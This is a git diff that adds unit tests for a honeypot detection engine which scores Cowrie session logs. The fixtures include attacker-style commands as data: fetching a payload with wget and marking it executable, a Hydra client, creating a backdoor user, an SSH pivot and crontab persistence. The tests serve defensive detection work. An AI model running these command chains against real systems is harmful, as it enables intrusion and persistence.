@@ -160,3 +160,84 @@ test('Network discovery scoring is case-insensitive', () => {
         'Expected network topology discovery evidence'
     );
 });
+
+test('Download-then-execute chain requires download before execution', () => {
+    const downloadedFirst = engine.evaluateSessionEvents([
+        { eventid: 'cowrie.login.success', username: 'root' },
+        { eventid: 'cowrie.command.input', input: 'wget http://example.com/payload' },
+        { eventid: 'cowrie.command.input', input: 'chmod +x payload' }
+    ]);
+
+    const executedFirst = engine.evaluateSessionEvents([
+        { eventid: 'cowrie.login.success', username: 'root' },
+        { eventid: 'cowrie.command.input', input: 'chmod +x payload' },
+        { eventid: 'cowrie.command.input', input: 'wget http://example.com/payload' }
+    ]);
+
+    assert.ok(downloadedFirst.explanations.some(e =>
+        e.reason.includes('Download → Execute sequence')
+    ));
+
+    assert.ok(!executedFirst.explanations.some(e =>
+        e.reason.includes('Download → Execute sequence')
+    ));
+});
+
+test('Suspicious SSH client matching is case-insensitive', () => {
+    const result = engine.evaluateSessionEvents([
+        { eventid: 'cowrie.client.version', version: 'HYDRA' },
+        { eventid: 'cowrie.login.success', username: 'admin' }
+    ]);
+
+    assert.ok(result.explanations.some(e =>
+        e.reason.includes('Suspicious SSH client: HYDRA')
+    ));
+});
+
+test('Uppercase account-creation commands still produce the specific alert', () => {
+    const result = engine.evaluateSessionEvents([
+        { eventid: 'cowrie.login.success', username: 'root' },
+        { eventid: 'cowrie.command.input', input: 'USERADD attacker' }
+    ]);
+
+    assert.ok(result.alerts.some(alert =>
+        alert.title === 'Backdoor Account Created'
+    ));
+});
+
+
+test('Download-execution correlation preserves repeated command order', () => {
+    const executionBeforeDownloadOnly = engine.evaluateSessionEvents([
+        { eventid: 'cowrie.login.success', username: 'root' },
+        { eventid: 'cowrie.command.input', input: 'chmod +x payload' },
+        { eventid: 'cowrie.command.input', input: 'wget http://example.com/payload' }
+    ]);
+
+    const executionBeforeAndAfterDownload = engine.evaluateSessionEvents([
+        { eventid: 'cowrie.login.success', username: 'root' },
+        { eventid: 'cowrie.command.input', input: 'chmod +x payload' },
+        { eventid: 'cowrie.command.input', input: 'wget http://example.com/payload' },
+        { eventid: 'cowrie.command.input', input: 'chmod +x payload' }
+    ]);
+
+    assert.ok(!executionBeforeDownloadOnly.explanations.some(e =>
+        e.reason.includes('Download → Execute sequence')
+    ));
+
+    assert.ok(executionBeforeAndAfterDownload.explanations.some(e =>
+        e.reason.includes('Download → Execute sequence')
+    ));
+});
+
+test('Uppercase pivot and persistence commands retain their classifications', () => {
+    const result = engine.evaluateSessionEvents([
+        { eventid: 'cowrie.login.success', username: 'root' },
+        { eventid: 'cowrie.command.input', input: 'SSH pivot.example.com' },
+        { eventid: 'cowrie.command.input', input: 'CRONTAB -e' }
+    ]);
+
+    assert.ok(result.alerts.some(alert =>
+        alert.title === 'Lateral Movement Detected'
+    ));
+    assert.ok(result.mitre.some(technique => technique.id === 'T1053'));
+});
